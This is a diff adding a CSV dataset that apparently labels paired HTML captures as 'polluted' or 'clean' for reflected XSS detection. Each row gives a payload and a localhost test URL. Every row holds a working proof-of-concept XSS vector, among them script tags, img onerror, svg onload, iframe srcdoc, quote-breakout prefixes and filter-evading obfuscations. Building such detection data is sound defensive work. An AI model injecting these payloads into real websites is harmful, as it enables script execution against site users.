@@ -1,0 +1,49 @@
+filename,label,xss_type,payload,source_url
+polluted_reflected_1755681857_1.html,polluted,reflected,<script>alert(1)</script>,http://127.0.0.1:8000/data.php?tpl=%3Cscript%3Ealert%281%29%3C/script%3E&token=demo&200=val
+clean_reflected_1755681857_1.html,clean,reflected,<script>alert(1)</script>,http://127.0.0.1:8000/data_safe.php?tpl=%3Cscript%3Ealert%281%29%3C/script%3E&token=demo&200=val
+polluted_reflected_1755681857_2.html,polluted,reflected,<ScRiPt>alert(1)</ScRiPt>,http://127.0.0.1:8000/data.php?tpl=%3CScRiPt%3Ealert%281%29%3C/ScRiPt%3E&token=demo&200=val
+clean_reflected_1755681857_2.html,clean,reflected,<ScRiPt>alert(1)</ScRiPt>,http://127.0.0.1:8000/data_safe.php?tpl=%3CScRiPt%3Ealert%281%29%3C/ScRiPt%3E&token=demo&200=val
+polluted_reflected_1755681857_3.html,polluted,reflected,<script>alert`1`</script>,http://127.0.0.1:8000/data.php?tpl=%3Cscript%3Ealert%601%60%3C/script%3E&token=demo&200=val
+clean_reflected_1755681857_3.html,clean,reflected,<script>alert`1`</script>,http://127.0.0.1:8000/data_safe.php?tpl=%3Cscript%3Ealert%601%60%3C/script%3E&token=demo&200=val
+polluted_reflected_1755681857_4.html,polluted,reflected,<img src=x onerror=alert(1)>,http://127.0.0.1:8000/data.php?tpl=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&token=demo&200=val
+clean_reflected_1755681857_4.html,clean,reflected,<img src=x onerror=alert(1)>,http://127.0.0.1:8000/data_safe.php?tpl=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&token=demo&200=val
+polluted_reflected_1755681857_5.html,polluted,reflected,<img src=x onerror=prompt(document.domain)>,http://127.0.0.1:8000/data.php?tpl=%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3E&token=demo&200=val
+clean_reflected_1755681857_5.html,clean,reflected,<img src=x onerror=prompt(document.domain)>,http://127.0.0.1:8000/data_safe.php?tpl=%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3E&token=demo&200=val
+polluted_reflected_1755681857_6.html,polluted,reflected,<img src=x onerror=confirm(1)>,http://127.0.0.1:8000/data.php?tpl=%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E&token=demo&200=val
+clean_reflected_1755681857_6.html,clean,reflected,<img src=x onerror=confirm(1)>,http://127.0.0.1:8000/data_safe.php?tpl=%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E&token=demo&200=val
+polluted_reflected_1755681857_7.html,polluted,reflected,"<img src=""x"" onerror=""alert(1)"">",http://127.0.0.1:8000/data.php?tpl=%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%3E&token=demo&200=val
+clean_reflected_1755681857_7.html,clean,reflected,"<img src=""x"" onerror=""alert(1)"">",http://127.0.0.1:8000/data_safe.php?tpl=%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%281%29%22%3E&token=demo&200=val
+polluted_reflected_1755681857_8.html,polluted,reflected,<img src=x onerror=alert(1)//>,http://127.0.0.1:8000/data.php?tpl=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29//%3E&token=demo&200=val
+clean_reflected_1755681857_8.html,clean,reflected,<img src=x onerror=alert(1)//>,http://127.0.0.1:8000/data_safe.php?tpl=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29//%3E&token=demo&200=val
+polluted_reflected_1755681857_9.html,polluted,reflected,<img src=x onerror=alert/**/(1)>,http://127.0.0.1:8000/data.php?tpl=%3Cimg%20src%3Dx%20onerror%3Dalert/%2A%2A/%281%29%3E&token=demo&200=val
+clean_reflected_1755681857_9.html,clean,reflected,<img src=x onerror=alert/**/(1)>,http://127.0.0.1:8000/data_safe.php?tpl=%3Cimg%20src%3Dx%20onerror%3Dalert/%2A%2A/%281%29%3E&token=demo&200=val
+polluted_reflected_1755681857_10.html,polluted,reflected,<img src=x onerror=(alert)(1)>,http://127.0.0.1:8000/data.php?tpl=%3Cimg%20src%3Dx%20onerror%3D%28alert%29%281%29%3E&token=demo&200=val
+clean_reflected_1755681857_10.html,clean,reflected,<img src=x onerror=(alert)(1)>,http://127.0.0.1:8000/data_safe.php?tpl=%3Cimg%20src%3Dx%20onerror%3D%28alert%29%281%29%3E&token=demo&200=val
+polluted_reflected_1755681857_11.html,polluted,reflected,<svg onload=alert(1)>,http://127.0.0.1:8000/data.php?tpl=%3Csvg%20onload%3Dalert%281%29%3E&token=demo&200=val
+clean_reflected_1755681857_11.html,clean,reflected,<svg onload=alert(1)>,http://127.0.0.1:8000/data_safe.php?tpl=%3Csvg%20onload%3Dalert%281%29%3E&token=demo&200=val
+polluted_reflected_1755681857_12.html,polluted,reflected,<svg/onload=alert(1)>,http://127.0.0.1:8000/data.php?tpl=%3Csvg/onload%3Dalert%281%29%3E&token=demo&200=val
+clean_reflected_1755681857_12.html,clean,reflected,<svg/onload=alert(1)>,http://127.0.0.1:8000/data_safe.php?tpl=%3Csvg/onload%3Dalert%281%29%3E&token=demo&200=val
+polluted_reflected_1755681857_13.html,polluted,reflected,<svg onload=alert&#40;1&#41;>,http://127.0.0.1:8000/data.php?tpl=%3Csvg%20onload%3Dalert%26%2340%3B1%26%2341%3B%3E&token=demo&200=val
+clean_reflected_1755681857_13.html,clean,reflected,<svg onload=alert&#40;1&#41;>,http://127.0.0.1:8000/data_safe.php?tpl=%3Csvg%20onload%3Dalert%26%2340%3B1%26%2341%3B%3E&token=demo&200=val
+polluted_reflected_1755681857_14.html,polluted,reflected,"<svg xmlns=""http://www.w3.org/2000/svg"" onload=alert(1)>",http://127.0.0.1:8000/data.php?tpl=%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20onload%3Dalert%281%29%3E&token=demo&200=val
+clean_reflected_1755681857_14.html,clean,reflected,"<svg xmlns=""http://www.w3.org/2000/svg"" onload=alert(1)>",http://127.0.0.1:8000/data_safe.php?tpl=%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20onload%3Dalert%281%29%3E&token=demo&200=val
+polluted_reflected_1755681857_15.html,polluted,reflected,<svg onload=window['al'+'ert'](1)>,http://127.0.0.1:8000/data.php?tpl=%3Csvg%20onload%3Dwindow%5B%27al%27%2B%27ert%27%5D%281%29%3E&token=demo&200=val
+clean_reflected_1755681857_15.html,clean,reflected,<svg onload=window['al'+'ert'](1)>,http://127.0.0.1:8000/data_safe.php?tpl=%3Csvg%20onload%3Dwindow%5B%27al%27%2B%27ert%27%5D%281%29%3E&token=demo&200=val
+polluted_reflected_1755681857_16.html,polluted,reflected,<svg><script>alert(1)</script></svg>,http://127.0.0.1:8000/data.php?tpl=%3Csvg%3E%3Cscript%3Ealert%281%29%3C/script%3E%3C/svg%3E&token=demo&200=val
+clean_reflected_1755681857_16.html,clean,reflected,<svg><script>alert(1)</script></svg>,http://127.0.0.1:8000/data_safe.php?tpl=%3Csvg%3E%3Cscript%3Ealert%281%29%3C/script%3E%3C/svg%3E&token=demo&200=val
+polluted_reflected_1755681857_17.html,polluted,reflected,<input autofocus onfocus=alert(1)>,http://127.0.0.1:8000/data.php?tpl=%3Cinput%20autofocus%20onfocus%3Dalert%281%29%3E&token=demo&200=val
+clean_reflected_1755681857_17.html,clean,reflected,<input autofocus onfocus=alert(1)>,http://127.0.0.1:8000/data_safe.php?tpl=%3Cinput%20autofocus%20onfocus%3Dalert%281%29%3E&token=demo&200=val
+polluted_reflected_1755681857_18.html,polluted,reflected,<marquee onstart=alert(1)>x</marquee>,http://127.0.0.1:8000/data.php?tpl=%3Cmarquee%20onstart%3Dalert%281%29%3Ex%3C/marquee%3E&token=demo&200=val
+clean_reflected_1755681857_18.html,clean,reflected,<marquee onstart=alert(1)>x</marquee>,http://127.0.0.1:8000/data_safe.php?tpl=%3Cmarquee%20onstart%3Dalert%281%29%3Ex%3C/marquee%3E&token=demo&200=val
+polluted_reflected_1755681857_19.html,polluted,reflected,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",http://127.0.0.1:8000/data.php?tpl=%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert%281%29%3C/script%3E%22%3E%3C/iframe%3E&token=demo&200=val
+clean_reflected_1755681857_19.html,clean,reflected,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",http://127.0.0.1:8000/data_safe.php?tpl=%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert%281%29%3C/script%3E%22%3E%3C/iframe%3E&token=demo&200=val
+polluted_reflected_1755681857_20.html,polluted,reflected,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",http://127.0.0.1:8000/data.php?tpl=%3Ciframe%20srcdoc%3D%22%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%22%3E%3C/iframe%3E&token=demo&200=val
+clean_reflected_1755681857_20.html,clean,reflected,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",http://127.0.0.1:8000/data_safe.php?tpl=%3Ciframe%20srcdoc%3D%22%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%22%3E%3C/iframe%3E&token=demo&200=val
+polluted_reflected_1755681857_21.html,polluted,reflected,"""><svg onload=alert(1)>",http://127.0.0.1:8000/data.php?tpl=%22%3E%3Csvg%20onload%3Dalert%281%29%3E&token=demo&200=val
+clean_reflected_1755681857_21.html,clean,reflected,"""><svg onload=alert(1)>",http://127.0.0.1:8000/data_safe.php?tpl=%22%3E%3Csvg%20onload%3Dalert%281%29%3E&token=demo&200=val
+polluted_reflected_1755681857_22.html,polluted,reflected,'><svg onload=alert(1)>,http://127.0.0.1:8000/data.php?tpl=%27%3E%3Csvg%20onload%3Dalert%281%29%3E&token=demo&200=val
+clean_reflected_1755681857_22.html,clean,reflected,'><svg onload=alert(1)>,http://127.0.0.1:8000/data_safe.php?tpl=%27%3E%3Csvg%20onload%3Dalert%281%29%3E&token=demo&200=val
+polluted_reflected_1755681857_23.html,polluted,reflected,><svg onload=alert(1)>,http://127.0.0.1:8000/data.php?tpl=%3E%3Csvg%20onload%3Dalert%281%29%3E&token=demo&200=val
+clean_reflected_1755681857_23.html,clean,reflected,><svg onload=alert(1)>,http://127.0.0.1:8000/data_safe.php?tpl=%3E%3Csvg%20onload%3Dalert%281%29%3E&token=demo&200=val
+polluted_reflected_1755681857_24.html,polluted,reflected,<img src=x onerror=prompt(location.host)>,http://127.0.0.1:8000/data.php?tpl=%3Cimg%20src%3Dx%20onerror%3Dprompt%28location.host%29%3E&token=demo&200=val
+clean_reflected_1755681857_24.html,clean,reflected,<img src=x onerror=prompt(location.host)>,http://127.0.0.1:8000/data_safe.php?tpl=%3Cimg%20src%3Dx%20onerror%3Dprompt%28location.host%29%3E&token=demo&200=val
